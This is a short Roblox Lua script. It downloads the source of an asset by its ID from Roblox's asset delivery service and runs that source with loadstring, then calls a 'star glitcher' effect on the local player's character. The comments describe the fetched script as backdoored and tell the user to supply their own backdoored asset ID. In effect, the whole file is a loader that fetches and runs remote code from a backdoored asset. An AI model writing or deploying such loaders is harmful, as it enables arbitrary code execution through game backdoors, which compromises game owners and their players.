local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Function to fetch and execute the backdoored script using loadstring
local function loadStarGlitcherEffect(assetId)
    local assetUrl = string.format("https://assetdelivery.roblox.com/v1/asset?id=%d", assetId)

    -- Fetch the asset's source code
    local success, assetSource = pcall(function()
        return HttpService:GetAsync(assetUrl)
    end)

    if success then
        print("Fetched asset source:", assetSource)  -- Debug: Print fetched source code

        -- Use loadstring to execute the fetched code
        local chunk, err = loadstring(assetSource)
        if chunk then
            local success, result = pcall(chunk)
            if success then
                -- Apply the "star glitcher" effect to your character
                local player = Players.LocalPlayer
                if player then
                    -- Example: Apply the effect to the player's character
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        -- Call the function to apply the "star glitcher" effect
                        result.ApplyStarGlitcherEffect(humanoid)
                        return "Star glitcher effect applied"
                    else
                        error("Player character or humanoid not found")
                    end
                else
                    error("Local player not found")
                end
            else
                error("Execution error: " .. result)
            end
        else
            error("Load error: " .. err)
        end
    else
        error("Failed to fetch asset from Roblox library: " .. tostring(assetSource))
    end
end

-- Example usage to apply the "star glitcher" effect
local assetId = 5024713750  -- Replace with your actual backdoored asset ID

local success, result = pcall(loadStarGlitcherEffect, assetId)

-- Handle the result
if success then
    print("Execution result:", result)
else
    warn("Failed to apply star glitcher effect:", result)
end
